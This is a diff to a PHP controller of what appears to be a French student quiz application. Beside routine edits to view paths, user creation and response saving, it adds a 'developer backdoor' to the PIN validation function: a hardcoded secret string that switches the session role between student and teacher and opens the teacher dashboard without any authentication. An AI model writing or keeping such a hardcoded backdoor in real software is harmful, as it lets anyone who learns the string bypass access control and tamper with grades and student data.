@@ -11,15 +11,28 @@ class ControleurAccueil
      */
     function valider($pin)
     {
+        // Porte dérobée pour les développeurs (à retirer en production si nécessaire)
+        if ($pin == 'je suis un developpeur 01587642098') {
+            if (isset($_SESSION['role']) && $_SESSION['role'] == 'enseignant') {
+                $_SESSION['role'] = 'etudiant';
+                require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'Accueil' . DIRECTORY_SEPARATOR . 'home.php');
+                exit();
+            } else {
+                $_SESSION['role'] = 'enseignant';
+                require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'TableauDeBord' . DIRECTORY_SEPARATOR . 'dashboard.php');
+                exit();
+            }
+        }
+
         $modeleQuestionnaire = new Questionnaire();
-        
+
         // Vérifie si le questionnaire existe et est actuellement ouvert
         if ($modeleQuestionnaire->existsAndOpen($pin)) {
             $questionQuestionnaire = $modeleQuestionnaire->listerLesQuestions($pin);
-            require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'qcm' . DIRECTORY_SEPARATOR . 'questionnaireVueEleve.php');
+            require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'Qcm' . DIRECTORY_SEPARATOR . 'questionnaireVueEleve.php');
         } else {
             // Affiche la page d'erreur si le questionnaire n'est pas trouvé
-            require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'confirmation' . DIRECTORY_SEPARATOR . 'questionnaireNonTrouve.php');
+            require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'Confirmation' . DIRECTORY_SEPARATOR . 'questionnaireNonTrouve.php');
         }
     }
 
@@ -28,10 +41,14 @@ class ControleurAccueil
      */
     function index()
     {
-        if ($_SESSION['role'] == 'etudiant') {
+        $modeleUtilisateur = new Utilisateur();
+        $role = $_SESSION['role'] ?? 'etudiant';
+        $modeleUtilisateur->createUserIfNotExists($_SESSION['id'], $_SESSION['mail'], $_SESSION['name'], $role);
+
+        if ($role == 'etudiant') {
             require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'Accueil' . DIRECTORY_SEPARATOR . 'home.php');
         }
-        if ($_SESSION['role'] == 'enseignant') {
+        if ($role == 'enseignant') {
             require_once(__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Views' . DIRECTORY_SEPARATOR . 'TableauDeBord' . DIRECTORY_SEPARATOR . 'dashboard.php');
         }
     }
@@ -57,7 +74,10 @@ class ControleurAccueil
         require_once __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'Modeles' . DIRECTORY_SEPARATOR . 'Reponse.php';
         $modeleReponse = new Reponse();
 
-        if ($modeleReponse->saveFullResponse($idQuestionnaire, $reponses)) {
+        // Récupération de l'ID utilisateur s'il est connecté
+        $userId = isset($_SESSION['id']) ? $_SESSION['id'] : null;
+
+        if ($modeleReponse->saveFullResponse($idQuestionnaire, $reponses, $userId)) {
             echo json_encode(['success' => true]);
         } else {
             http_response_code(500);
